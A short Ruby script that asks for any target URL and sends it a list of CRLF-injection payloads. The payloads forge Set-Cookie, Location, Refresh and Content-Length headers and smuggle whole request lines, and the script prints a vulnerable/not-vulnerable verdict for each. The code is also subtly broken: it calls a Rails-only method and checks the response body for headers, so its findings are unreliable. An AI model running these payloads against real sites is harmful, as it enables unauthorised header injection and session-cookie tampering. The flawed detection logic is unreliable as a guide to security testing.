#!/usr/bin/env ruby

require 'net/http'

# Prompt for the target URL
print "Enter your target URL: "
target_url = gets.chomp

# Craft payloads with various CRLF injection techniques
payloads = [
  # CRLF injection in Set-Cookie header
  "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",

  # CRLF injection in Content-Length header
  "username=test%0D%0AContent-Length:%200%0D%0A&password=test",

  # CRLF injection in Refresh header
  "username=test%0D%0ARefresh:%200%0D%0A&password=test",

  # CRLF injection in Location header
  "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",

  # CRLF injection in User-Agent header
  "User-Agent:%20Malicious%0D%0Ausername=test&password=test",

  # CRLF injection in Referer header
  "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",

  # CRLF injection in Proxy header
  "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",

  # CRLF injection in Set-Cookie2 header
  "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",

  # CRLF injection in any other custom header
  "CustomHeader:%20Injection%0D%0Ausername=test&password=test",

  # CRLF injection in HTTP request method
  "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

  # CRLF injection in HTTP version
  "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",

  # CRLF injection in MIME types
  "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",

  # CRLF injection in HTML comment
  "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->"
]

# Testing function to send requests and check responses
def test_crlf_injection(payload, target_url)
  uri = URI(target_url)
  http = Net::HTTP.new(uri.host, uri.port)
  request = Net::HTTP::Post.new(uri.request_uri)
  request.body = URI.decode_www_form(payload).to_h.to_query

  response = http.request(request)
  
  if response.body.include?("maliciousCookie=maliciousValue") ||
     response.body.include?("Refresh: 0") ||
     response.body.include?("Content-Length: 0") ||
     response.body.include?("Location: https://www.bbc.com")
    puts "Vulnerable to CRLF Injection: #{payload}"
  else
    puts "Not vulnerable to CRLF Injection: #{payload}"
  end
end

# Loop through payloads and test for vulnerabilities
payloads.each do |payload|
  test_crlf_injection(payload, target_url)
end
